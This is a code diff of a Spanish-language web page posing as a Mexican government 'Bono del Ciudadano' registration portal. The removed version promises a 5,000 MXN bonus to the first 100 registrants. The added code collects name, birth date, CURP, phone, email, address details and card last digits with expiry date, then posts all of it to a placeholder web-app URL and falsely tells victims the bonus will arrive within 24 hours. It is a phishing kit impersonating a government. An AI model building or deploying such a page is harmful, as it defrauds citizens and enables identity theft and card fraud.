@@ -1,226 +1,91 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registro | Bono del Ciudadano - Gobierno de México</title>
-    <style>
-        :root {
-            --gob-verde: #13322B;
-            --gob-guinda: #9F2241;
-            --gob-dorado: #D4C19C;
-            --gob-gris: #F2F2F2;
-            --gob-blanco: #FFFFFF;
-        }
-
-        body {
-            font-family: 'Montserrat', Arial, sans-serif;
-            background-color: var(--gob-gris);
-            margin: 0;
-            padding: 0;
-            color: #333;
-        }
-
-        /* Encabezado Institucional */
-        header {
-            background-color: var(--gob-verde);
-            padding: 15px 10%;
-            border-bottom: 4px solid var(--gob-dorado);
-            display: flex;
-            align-items: center;
-        }
-
-        header h1 {
-            color: white;
-            font-size: 1.2rem;
-            margin: 0;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        /* Contenedor Principal */
-        .container {
-            max-width: 800px;
-            margin: 50px auto;
-            background: var(--gob-blanco);
-            padding: 40px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            border-radius: 4px;
-        }
-
-        h2 {
-            color: var(--gob-guinda);
-            border-bottom: 2px solid var(--gob-dorado);
-            padding-bottom: 10px;
-            margin-bottom: 30px;
-        }
-
-        /* Formulario */
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            font-weight: bold;
-            margin-bottom: 8px;
-            color: var(--gob-verde);
-        }
-
-        input, select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 1rem;
-        }
-
-        button {
-            background-color: var(--gob-guinda);
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 1.1rem;
-            font-weight: bold;
-            width: 100%;
-            margin-top: 20px;
-            transition: background 0.3s;
-        }
-
-        button:hover {
-            background-color: #7a1a32;
-        }
-
-        /* Modal (Pop-up) */
-        .modal {
-            display: none; 
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.7);
-        }
-
-        .modal-content {
-            background-color: white;
-            margin: 10% auto;
-            padding: 30px;
-            width: 80%;
-            max-width: 600px;
-            border-top: 10px solid var(--gob-guinda);
-            border-radius: 8px;
-            position: relative;
-            text-align: center;
-        }
-
-        .modal-content h3 {
-            color: var(--gob-verde);
-            font-size: 1.5rem;
-        }
-
-        .modal-content p {
-            line-height: 1.6;
-            text-align: justify;
-        }
-
-        .close-btn {
-            background: var(--gob-verde);
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-
-        footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 0.8rem;
-            color: #666;
-            margin-top: 40px;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Registro | Bono del Ciudadano</title>
+  <style>
+    :root{--v:#13322B;--g:#9F2241;--d:#D4C19C;--bg:#F2F2F2}
+    body{font-family:Arial,sans-serif;margin:0;background:var(--bg)}
+    header{background:var(--v);color:#fff;padding:14px 8%;border-bottom:4px solid var(--d)}
+    .container{max-width:920px;margin:28px auto;background:#fff;padding:28px;border-radius:6px;box-shadow:0 4px 12px rgba(0,0,0,.12)}
+    .grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}.full{grid-column:1/-1}
+    label{display:block;font-weight:700;color:var(--v);margin-bottom:6px}
+    input,select{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}
+    button{width:100%;padding:12px;border:0;border-radius:4px;background:var(--g);color:#fff;font-weight:700;cursor:pointer}
+    .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:10}
+    .modal-content{background:#fff;max-width:620px;width:92%;margin:8% auto;padding:24px;border-top:10px solid var(--g);border-radius:8px}
+  </style>
 </head>
 <body>
+<header><strong>Gobierno de México | Registro de Bono</strong></header>
 
-    <header>
-        <h1>Gobierno de México | Bienestar</h1>
-    </header>
+<div id="welcomeModal" class="modal" style="display:block">
+  <div class="modal-content">
+    <h3>Bienvenido al Bono del Ciudadano</h3>
+    <p>Complete su registro de forma individual. Al finalizar el formulario se abrirá el último paso para validar la tarjeta de depósito.</p>
+    <button onclick="closeModal('welcomeModal')">Entendido y continuar</button>
+  </div>
+</div>
 
-    <div id="infoModal" class="modal">
-        <div class="modal-content">
-            <h3>¡Felicidades! Beneficiario del Bono del Ciudadano</h3>
-            <p>
-                Usted ha sido seleccionado para participar en el programa <strong>"Bono del Ciudadano"</strong>, una iniciativa impulsada en este sexenio para apoyar la economía de las familias mexicanas. 
-                <br><br>
-                Este apoyo único de <strong>$5,000.00 MXN</strong> está limitado estrictamente a los primeros <strong>100 ciudadanos</strong> que completen su registro correctamente en este portal oficial. 
-                <br><br>
-                <strong>Importante:</strong> El bono será entregado exclusivamente mediante depósito en su tarjeta física (no se aceptarán tarjetas digitales ni billeteras virtuales) para garantizar la integridad del proceso.
-            </p>
-            <button class="close-btn" onclick="cerrarModal()">Entendido y Continuar</button>
-        </div>
+<div id="cardModal" class="modal">
+  <div class="modal-content">
+    <h3>ULTIMO PASO...</h3>
+    <p>Por favor indique la tarjeta a la cual recibirá el bono (solo últimos 4 dígitos por seguridad) y su fecha de expiración.</p>
+    <div class="grid">
+      <div class="full"><label for="tarjeta">Tarjeta</label><input id="tarjeta" maxlength="4" pattern="[0-9]{4}" required></div>
+      <div><label for="expMes">Mes</label><input id="expMes" maxlength="2" pattern="(0[1-9]|1[0-2])" placeholder="MM" required></div>
+      <div><label for="expAnio">Año</label><input id="expAnio" maxlength="2" pattern="[0-9]{2}" placeholder="AA" required></div>
+      <div class="full"><button id="btnFinalizar">Finalizar registro</button></div>
     </div>
+  </div>
+</div>
 
-    <div class="container">
-        <h2>Registro de Beneficiario</h2>
-        <form id="formBono">
-            <div class="form-group">
-                <label for="nombre">Nombre(s)</label>
-                <input type="text" id="nombre" name="nombre" required>
-            </div>
-            <div class="form-group">
-                <label for="apellido">Apellidos</label>
-                <input type="text" id="apellido" name="apellido" required>
-            </div>
-            <div class="form-group">
-                <label for="edad">Edad</label>
-                <input type="number" id="edad" name="edad" min="18" max="110" required>
-            </div>
-            <div class="form-group">
-                <label for="estado">Estado de la República</label>
-                <select id="estado" name="estado" required>
-                    <option value="">Seleccione su estado...</option>
-                    <option value="Aguascalientes">Aguascalientes</option>
-                    <option value="Baja California">Baja California</option>
-                    <option value="Sonora">Sonora</option>
-                    </select>
-            </div>
-            <div class="form-group">
-                <label for="curp">CURP (Clave Única de Registro de Población)</label>
-                <input type="text" id="curp" name="curp" pattern=".{18}" title="La CURP debe tener 18 caracteres" required style="text-transform: uppercase;">
-            </div>
-            
-            <button type="submit">Finalizar Registro y Reclamar Bono</button>
-        </form>
-    </div>
+<div class="container">
+  <h2>Registro de Beneficiario</h2>
+  <form id="formBono" class="grid">
+    <div class="full"><label for="nombre">Nombre completo</label><input id="nombre" required></div>
+    <div><label for="fecha">Fecha de nacimiento</label><input type="date" id="fecha" required></div>
+    <div><label for="curp">CURP</label><input id="curp" maxlength="18" required></div>
+    <div><label for="estado">Estado</label><select id="estado" required><option value="">Seleccione...</option><option>Aguascalientes</option><option>Baja California</option><option>Baja California Sur</option><option>Campeche</option><option>Chiapas</option><option>Chihuahua</option><option>Ciudad de México</option><option>Coahuila</option><option>Colima</option><option>Durango</option><option>Estado de México</option><option>Guanajuato</option><option>Guerrero</option><option>Hidalgo</option><option>Jalisco</option><option>Michoacán</option><option>Morelos</option><option>Nayarit</option><option>Nuevo León</option><option>Oaxaca</option><option>Puebla</option><option>Querétaro</option><option>Quintana Roo</option><option>San Luis Potosí</option><option>Sinaloa</option><option>Sonora</option><option>Tabasco</option><option>Tamaulipas</option><option>Tlaxcala</option><option>Veracruz</option><option>Yucatán</option><option>Zacatecas</option></select></div>
+    <div><label for="ciudad">Ciudad</label><input id="ciudad" required></div>
+    <div><label for="numeroCel">Número de teléfono</label><input id="numeroCel" type="tel" pattern="[0-9]{10}" required></div>
+    <div><label for="codigoPost">Código postal</label><input id="codigoPost" pattern="[0-9]{5}" required></div>
+    <div><label for="correo">Correo electrónico</label><input id="correo" type="email" required></div>
+    <div><label for="fechaRegistro">Fecha de registro</label><input id="fechaRegistro" type="date" required></div>
+    <div class="full"><button type="submit">Continuar al último paso</button></div>
+  </form>
+</div>
 
-    <footer>
-        © 2026 Gobierno de México - Secretaría de Bienestar <br>
-        Este programa es público, ajeno a cualquier partido político.
-    </footer>
+<script>
+const API_URL = 'PEGA_AQUI_URL_WEBAPP';
+const payload = {};
+document.getElementById('fechaRegistro').valueAsDate = new Date();
+function closeModal(id){document.getElementById(id).style.display='none';}
 
-    <script>
-        // Mostrar el pop-up automáticamente al cargar
-        window.onload = function() {
-            document.getElementById('infoModal').style.display = 'block';
-        };
+document.getElementById('formBono').addEventListener('submit',(e)=>{
+  e.preventDefault();
+  Object.assign(payload, {
+    nombre:nombre.value.trim(),fecha:fecha.value,estado:estado.value,ciudad:ciudad.value.trim(),
+    curp:curp.value.trim().toUpperCase(),numeroCel:numeroCel.value.trim(),codigoPost:codigoPost.value.trim(),
+    correo:correo.value.trim().toLowerCase(),fechaRegistro:fechaRegistro.value
+  });
+  document.getElementById('cardModal').style.display='block';
+});
 
-        function cerrarModal() {
-            document.getElementById('infoModal').style.display = 'none';
-        }
-
-        // Manejo del envío del formulario (Conexión futura a Google Sheets)
-        document.getElementById('formBono').onsubmit = function(e) {
-            e.preventDefault();
-            alert("Procesando datos del registro... En breve recibirá una confirmación.");
-            // Aquí se integrará el script de Google Sheets
-        };
-    </script>
+document.getElementById('btnFinalizar').addEventListener('click', async ()=>{
+  if(!tarjeta.value || !expMes.value || !expAnio.value){ alert('Completa los datos de tarjeta.'); return; }
+  payload.tarjeta = tarjeta.value.trim();
+  payload.exp = `${expMes.value}/${expAnio.value}`;
+  try{
+    const r = await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+    const j = await r.json();
+    if(!j.ok) throw new Error(j.error||'No guardado');
+    closeModal('cardModal');
+    alert('Se completó todo con éxito. En breve recibirá un correo electrónico con los datos; su bono será entregado en las próximas 24 horas.');
+    formBono.reset(); document.getElementById('fechaRegistro').valueAsDate = new Date();
+  }catch(err){ alert('Error al guardar: '+err.message); }
+});
+</script>
 </body>
 </html>
